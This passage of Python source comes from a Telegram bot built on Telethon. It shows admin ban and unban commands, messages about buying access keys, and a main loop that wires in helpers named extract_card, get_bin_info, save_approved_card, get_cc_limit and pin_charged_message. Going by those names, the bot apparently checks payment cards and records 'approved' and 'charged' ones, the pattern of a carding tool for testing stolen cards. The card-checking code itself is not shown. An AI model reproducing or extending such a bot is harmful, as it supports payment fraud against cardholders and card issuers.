            await client.send_message(user_id, f"🚫 𝙔𝙤𝙪 𝙃𝙖𝙫𝙚 𝘽𝙚𝙚𝙣 𝘽𝙖𝙣𝙣𝙚𝙙!\n\n𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤 𝙡𝙤𝙣𝙜𝙚𝙧 𝙖𝙗𝙡𝙚 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙤𝙧 𝙜𝙧𝙤𝙪𝙥 𝙘𝙝𝙖𝙩.\n\n𝙁𝙤𝙧 𝙖𝙥𝙥𝙚𝙖𝙡, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙈𝙤𝙙_𝘽𝙮_𝙆𝙖𝙢𝙖𝙡")
        except:
            pass

    except ValueError:
        await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙪𝙨𝙚𝙧 𝙄𝘿!")
    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern='/unban'))
async def unban_user_command(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!")

    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /unban {user_id}")

        user_id = int(parts[1])

        if not await is_banned_user(user_id):
            return await event.reply(f"❌ 𝙐𝙨𝙚𝙧 {user_id} 𝙞𝙨 𝙣𝙤𝙩 𝙗𝙖𝙣𝙣𝙚𝙙!")

        success = await unban_user(user_id)

        if success:
            await event.reply(f"✅ 𝙐𝙨𝙚𝙧 {user_id} 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙪𝙣𝙗𝙖𝙣𝙣𝙚𝙙!")

            try:
                await client.send_message(user_id, f"🎉 𝙔𝙤𝙪 𝙃𝙖𝙫𝙚 𝘽𝙚𝙚𝙣 𝙐𝙣𝙗𝙖𝙣𝙣𝙚𝙙!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙣𝙤𝙬 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙖𝙜𝙖𝙞𝙣 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥𝙨.\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙮𝙤𝙪 𝙬𝙞𝙡𝙡 𝙣𝙚𝙚𝙙 𝙩𝙤 𝙥𝙪𝙧𝙘𝙝𝙖𝙨𝙚 𝙖 𝙣𝙚𝙬 𝙠𝙚𝙮.")
            except:
                pass
        else:
            await event.reply(f"❌ 𝙁𝙖𝙞𝙡𝙚𝙙 𝙩𝙤 𝙪𝙣𝙗𝙖𝙣 𝙪𝙨𝙚𝙧 {user_id}")

    except ValueError:
        await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙪𝙨𝙚𝙧 𝙄𝘿!")
    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

async def main():
    await initialize_files()

    # Create a wrapper for get_cc_limit that can be used by external modules
    def get_cc_limit_wrapper(access_type, user_id=None):
        return get_cc_limit(access_type, user_id)
    
    utils_for_all = {
        'can_use': can_use,
        'banned_user_message': banned_user_message,
        'access_denied_message_with_button': access_denied_message_with_button,
        'extract_card': extract_card,
        'extract_all_cards': extract_card,
        'get_bin_info': get_bin_info,
        'save_approved_card': save_approved_card,
        'get_cc_limit': get_cc_limit_wrapper,
        'pin_charged_message': pin_charged_message,
        'ADMIN_ID': ADMIN_ID,
        'load_json': load_json,
        'save_json': save_json
    }

    
    while True:
        try:
            print("𝘽𝙊𝙏 𝙍𝙐𝙉𝙉𝙄𝙉𝙂 💨")
            await client.start(bot_token=BOT_TOKEN)
            await client.run_until_disconnected()
        except FloodWaitError as e:
            print(f"FloodWait: {e.seconds} seconds")
            await asyncio.sleep(e.seconds)
        except Exception as e:
            print(f"Error: {e}")
            await asyncio.sleep(10)

if __name__ == "__main__":
    asyncio.run(main())


    